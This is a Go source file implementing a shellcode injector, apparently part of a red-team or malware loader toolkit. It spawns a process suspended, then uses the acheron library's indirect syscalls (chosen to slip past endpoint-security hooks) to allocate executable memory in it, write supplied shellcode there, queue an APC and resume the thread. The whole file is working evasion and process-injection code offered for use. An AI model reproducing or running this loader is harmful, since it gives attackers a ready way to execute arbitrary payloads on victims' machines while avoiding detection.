package Indirect

import (
	"fmt"
	"syscall"
	"unsafe"

	"github.com/f1zm0/acheron"
	"golang.org/x/sys/windows"
)

const nullptr = uintptr(0)

type ShellcodeLoader struct {
	Acheron *acheron.Acheron
}

func Init() (*ShellcodeLoader, error) {
	ach, err := acheron.New()
	if err != nil {
		return nil, fmt.Errorf("[-] failed to initialize acheron: %w", err)
	}
	return &ShellcodeLoader{Acheron: ach}, nil
}

func (s *ShellcodeLoader) InjectShellcode(shellcode []byte, exePath string) error {
	fmt.Printf("[!] Using indirect syscalls with acheron ...\n")

	// Create a process in a suspended state
	si := new(windows.StartupInfo)
	pi := new(windows.ProcessInformation)

	err := windows.CreateProcess(
		syscall.StringToUTF16Ptr(exePath),
		nil,
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED,
		nil,
		nil,
		si,
		pi,
	)
	if err != nil {
		return fmt.Errorf("[-] failed to create process: %w", err)
	}
	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	fmt.Printf("[+] Process created in suspended state: PID %d\n", pi.ProcessId)

	var baseAddr uintptr
	scLen := len(shellcode)

	_, err = s.Acheron.Syscall(
		s.Acheron.HashString("NtAllocateVirtualMemory"),
		uintptr(pi.Process),
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(nil)),
		uintptr(unsafe.Pointer(&scLen)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if err != nil {
		return fmt.Errorf("[-] failed to allocate memory: %w", err)
	}
	fmt.Printf("[+] Allocated memory at: 0x%x\n", baseAddr)

	_, err = s.Acheron.Syscall(
		s.Acheron.HashString("NtWriteVirtualMemory"),
		uintptr(pi.Process),
		baseAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(scLen),
		nullptr,
	)
	if err != nil {
		return fmt.Errorf("[-] failed to write shellcode: %w", err)
	}
	fmt.Println("[+] Shellcode written to memory")

	// Queue APC for the main thread
	_, err = s.Acheron.Syscall(
		s.Acheron.HashString("NtQueueApcThread"),
		uintptr(pi.Thread),
		baseAddr,
		nullptr,
		nullptr,
		nullptr,
	)
	if err != nil {
		return fmt.Errorf("[-] failed to queue APC: %w", err)
	}
	fmt.Println("[+] APC queued successfully")

	_, err = s.Acheron.Syscall(
		s.Acheron.HashString("NtResumeThread"),
		uintptr(pi.Thread),
		nullptr,
	)
	if err != nil {
		return fmt.Errorf("[-] failed to resume thread: %w", err)
	}
	fmt.Println("[+] Thread resumed, shellcode executed!")

	return nil
}

//Thx archeron for this goat package
